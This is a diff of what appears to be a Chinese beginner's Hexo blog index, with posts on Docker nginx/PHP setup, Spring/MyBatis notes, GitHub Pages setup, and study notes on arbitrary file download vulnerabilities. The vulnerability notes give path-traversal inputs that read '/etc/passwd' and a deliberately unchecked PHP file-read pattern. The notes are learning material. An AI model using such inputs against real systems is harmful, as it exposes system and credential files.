-\2.    配置文件一定要正确挂载
-\3.    –network表示加入自己创建的网络mynet
-
-php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm
-
-
-
-\1.    php和nginx的初始页面必须挂载到同一路径
-​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
-\2.    –network表示加入自己创建的网络mynet
-
-修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
-
-
-
-我们需要更改：
-
-将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
-在location \块中，index中增加index.php
-将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
-fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-
-
-#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
-
-
-修改nginx.conf在http块中把default.conf的内容复制进去
-#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;
-
-
-测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
-随便写点html进去
-&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
-
-
- 编辑
-若正常显示，证明目录挂载没有出错
-如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
-检查php能否被解析创建index.php，写入
-&lt;?php phpinfo();?&gt;
-
-
-
-如果在浏览器中输入：
-http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php
-
-有以下结果
-编辑
-证明配置成功
-出现的问题以及解决
-
-nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
-环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-
-
-最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
-因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
-写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
-]]></content>
-      <categories>
-        <category>Docker</category>
-      </categories>
-      <tags>
-        <tag>Docker</tag>
-        <tag>Nginx</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1181,6 +1026,214 @@ manifest字段格式
       <tags>
         <tag>Web安全</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用Docker搭建Nginx以及PHP-fpm</title>
+    <url>/2025/01/17/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
+    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
+参考了docker部署php和nginx环境_docker nginx php-CSDN博客
+编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
+参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
+OS：centOS 7.9 64位
+要点
+最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
+自己创建目录结构尽量明了
+nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
+php.ini需要自己创建
+挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
+nginx的default.conf和nginx.conf一定要配置正确
+有问题多看日志，多拿错误日志信息问问ai（
+
+过程创建自己的网络docker network create mynet
+
+
+ 后续php容器，nginx容器加入该网络
+创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
+docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm
+
+
+
+1.参数说明：-d 后台运行 –name 给容器取个名字
+
+
+路径设置
+
+
+使用docker cp命令：
+将容器中路径的内容复制到docker host路径中
+docker cp 容器名:路径 目的路径
+nginx的配置文件位于&#x2F;etc&#x2F;nginx
+nginx的日志文件位于&#x2F;var&#x2F;log
+php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
+
+编辑
+
+将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx
+
+mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx
+
+
+
+ 用tree &#x2F;data看一下目录层级有没有正确
+如果没有安装tree
+yum install tree
+
+
+编辑
+复制php配置文件
+编辑
+
+进入php容器，可以用:
+php -i | grep php.ini
+得到配置文件路径
+&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
+
+#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./
+
+
+做完以上操作后，目录层级结构如下：
+
+编辑
+做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
+#工作路径/datamv ./php/php.ini-development ./php/php.ini
+
+
+ 修改后如下
+编辑
+然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
+mkdir ./wwwtouch ./www/index.html
+
+
+ 目录层级如下
+ 编辑
+删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)
+
+
+创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx
+
+
+
+\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
+\2.    配置文件一定要正确挂载
+\3.    –network表示加入自己创建的网络mynet
+
+php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm
+
+
+
+\1.    php和nginx的初始页面必须挂载到同一路径
+​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
+\2.    –network表示加入自己创建的网络mynet
+
+修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
+
+
+
+我们需要更改：
+
+将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
+在location \块中，index中增加index.php
+将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
+fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+
+
+#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
+
+
+修改nginx.conf在http块中把default.conf的内容复制进去
+#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;
+
+
+测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
+随便写点html进去
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+
+
+ 编辑
+若正常显示，证明目录挂载没有出错
+如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
+检查php能否被解析创建index.php，写入
+&lt;?php phpinfo();?&gt;
+
+
+
+如果在浏览器中输入：
+http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php
+
+有以下结果
+编辑
+证明配置成功
+出现的问题以及解决
+
+nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
+环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+
+
+最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
+因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
+写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+        <tag>Nginx</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>任意文件下载漏洞学习笔记</title>
+    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+参考：https://blog.csdn.net/qq_43531669/article/details/116865660
+什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
+这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
+这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
+下载文件后复制下载链接
+得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
+filename通过GET方法传入后端
+直接看代码
+
+filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
+1、漏洞利用条件1. 
+
+存在读文件的函数：
+ fopen()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
+
+ fread()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
+
+ include()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容
+
+ readfile()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容
+
+ file_get_context()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容
+
+ file()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容
+
+ 2.读取文件的路径用户可控且未校验或校验不严
+ 3.输出了文件内容
+
+
+漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd
+
+当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>任意文件下载漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>任意文件下载漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1762,12 +1815,166 @@ EmpMapper
 EmpServer的实现类
 @Overridepublic PageBean page(Integer page, Integer pageSize) &#123;    //设置分页参数    PageHelper.startPage(page,pageSize);    //执行查询    List&lt;Emp&gt; empList = empMapper.list();    Page&lt;Emp&gt; page1 = (Page&lt;Emp&gt;)empList;    //封装bean对象    PageBean pageBean = new PageBean(page1.getTotal(),page1.getResult());    return pageBean;&#125;
 
+条件分页查询接口文档
+Controller//方法声明public Result page(    @RequestParam(required = false) String name,    @RequestParam(required = false) Short gender,    @RequestParam(required = false) @DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;) LocalDate begin,     @RequestParam(required = false) @DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;) LocalDate end, 					                         @RequestParam(defaultValue = &quot;1&quot;) Integer page,     @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)
+
+Service层@Overridepublic PageBean page(String name, Short gender, LocalDate begin, LocalDate end, Integer page, Integer pageSize) &#123;    PageHelper.startPage(page,pageSize);    List&lt;Emp&gt;  empList = empMapper.page(name, gender, begin, end);    Page&lt;Emp&gt; empPage = (Page&lt;Emp&gt;) empList;    PageBean pageBean = new PageBean(empPage.getTotal(), empPage.getResult());    return pageBean;&#125;
+
+Mapper层/*** @param name* @param gender* @param begin 起始create_time* @param end   中止create_time* @return*/List&lt;Emp&gt; page(String name, Short gender, LocalDate begin, LocalDate end);
+
+使用了PageHelper之后，Mapper中就不要再使用page与pageSize参数，否则会导致生成的sql变为
+SELECT count(0) FROM emp LIMIT ?, ?
+
+就查不到了
+XML映射文件&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.springmybatisdemo.Mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;page&quot; resultType=&quot;com.wwwtty.springmybatisdemo.pojo.Emp&quot;&gt;            select * from emp                &lt;where&gt;                    	&lt;!-- 这里还需要判断空字符串，否则会多拼上name like %% --&gt;                        &lt;if test=&quot;name != null and name != &#x27;&#x27;&quot;&gt;                            name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;)                        &lt;/if&gt;                        &lt;if test=&quot;gender != null&quot;&gt;                            and gender = #&#123;gender&#125;                        &lt;/if&gt;                        &lt;if test=&quot;begin != null and end != null&quot;&gt;                            and entrydate between #&#123;begin&#125; and #&#123;end&#125;                        &lt;/if&gt;                &lt;/where&gt;        &lt;/select&gt;&lt;/mapper&gt;
+
+删除员工接口文档
+
+
+Controller层请求方法为Delete,@DeleteMapping(&#123;ids&#125;)注解;路径参数ids前加上@PathVariable
+
+@DeleteMapping(&quot;/&#123;ids&#125;&quot;)public Result delete(@PathVariable List&lt;Integer&gt; ids)&#123;    log.info(&quot;批量删除ids:&#123;&#125;&quot;,ids);    empservice.delete(ids);    return Result.success();&#125;
+
+Service层@Overridepublic void delete(List&lt;Integer&gt; ids) &#123;    empMapper.delete(ids);&#125;
+
+Mapper层对应sql:
+delete from emp where id in (1,2,3)
+
+xml映射文件中:&lt; foreach &gt;实现对数组的遍历
+&lt;delete id=&quot;delete&quot;&gt;    delete from emp where id in    &lt;foreach collection=&quot;ids&quot; item=&quot;id&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;&lt;/delete&gt;
+
+新增员工接口文档
+
+
+Controller层//前端发送json请求体，封装为pojo实体类@PostMappingpublic Result save(@RequestBody Emp emp)&#123;    empservice.save(emp);    return Result.success();&#125;
+
+Service层@Overridepublic void save(Emp emp) &#123;    emp.setCreateTime(LocalDateTime.now());    emp.setUpdateTime(LocalDateTime.now());    empMapper.insert(emp);&#125;
+
+Mapper层void insert(Emp emp);
+
+xml映射文件
+&lt;insert id=&quot;insert&quot;&gt;        insert into emp (username, name, gender, image, job, entrydate, dept_id,create_time,update_time) values     	(#&#123;username&#125;,#&#123;name&#125;,#&#123;gender&#125;,#&#123;image&#125;,#&#123;deptId&#125;,#&#123;entryDate&#125;,#&#123;job&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&lt;/insert&gt;
+
+文件上传前端表单：&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;    &lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;button type=&quot;submit&quot;&gt;submit&lt;/button&gt;&lt;/form&gt;
+
+
+若不指定enctype&#x3D;”multipart&#x2F;form-data”,上传时只会上传文件名
+
+
+改成enctype&#x3D;”multipart&#x2F;form-data”
+
+请求中有了文件内容
+
+
+后端:使用MultipartFile这个api来接收
+@Slf4j@RestControllerpublic class UploadController &#123;        @PostMapping(&quot;/upload&quot;)        public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image)&#123;                log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);                return Result.success();        &#125;&#125;
+
+进行测试:
+
+本地存储服务端，接收到上传的文件后，存储在本地服务器磁盘
+demo:在static目录下新建了一个upload目录
+
+@Slf4j@RestControllerpublic class UploadController &#123;        @PostMapping(&quot;/upload&quot;)        public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image) throws Exception &#123;                log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);                //获取原始文件名                String fileName =  image.getOriginalFilename();                //本地存储                image.transferTo(new File(&quot;static/upload&quot;+fileName));                                return Result.success();        &#125;&#125;
+
+postman测试
+
+
+存在问题:如果两个用户上传了相同名字的文件，那么就覆盖了
+所以我们需要构造唯一的文件名
+使用uuid@Testvoid contextLoads() &#123;    String uuid = UUID.randomUUID().toString();    System.out.println(uuid);&#125;
+
+简单的解决:(这么做有漏洞)@PostMapping(&quot;/upload&quot;)public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image) throws Exception &#123;    log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);    //获取原始文件名    String originalFilename =  image.getOriginalFilename();    //最后一个.的位置    int index = originalFilename.lastIndexOf(&#x27;.&#x27;);    //获取拓展名    String extName = originalFilename.substring(index);    //拼接文件名    String fileName = UUID.randomUUID().toString()+extName;    //本地存储    image.transferTo(new File(&quot;D:\\JavaWeb\\Spring-Mybatis-demo\\src\\main\\resources\\static\\upload\\&quot;+fileName));    return Result.success();&#125;
+
+如果上传一个大文件
+
+这是因为
+
+application.properties中
+#单个文件限制大小spring.servlet.multipart.max-file-size=10MB#单个请求上传大小spring.servlet.multipart.max-request-size=100MB
+
+
+云存储
+官方文档
+文件上传SDK
+复制官方代码
+获取endpoint
+设置上传到OSS中的文件名以及要上传的文件路径// 在OSS中叫什么名字String objectName = &quot;test.md&quot;;// 填写本地文件的完整路径，例如D:\\localpath\\examplefile.txt。// 如果未指定本地路径，则默认从示例程序所属项目对应本地路径中上传文件流。String filePath= &quot;D:\\My_Blogs\\myblogs\\source\\_posts\\Vue.md&quot;;// 填写Bucket所在地域。以华东1（杭州）为例，Region填写为cn-hangzhou。
+
+
+bucket文件列表中查看
+
 ]]></content>
       <categories>
         <category>JavaWeb</category>
       </categories>
       <tags>
         <tag>JavaWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建自己的GitHub-page</title>
+    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
+    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
+
+
+验证ssh -T git@github.com
+
+
+新建自己的仓库
+
+
+
+
+
+
+
+
+下载git下载链接:https://git-scm.com/downloads/win
+参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
+
+搭建本地博客创建博客目录
+安装hexonpm install -g hexo/cli
+
+
+#创建一个新的hexo项目hexo init myblogs
+
+
+此时的目录结构
+
+
+cd myblogsnpm install
+
+此时项目结构
+
+运行hexo项目
+hexo server
+
+
+部署到github获取个人token
+
+
+
+
+
+
+打开_config.yml
+
+编辑_config.yml
+当前博客目录安装git插件npm install hexo-deployer-git --save
+
+最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
+
+
+博客路径
+博客配置项在_config.yml中
+修改浏览器tab页标题
+
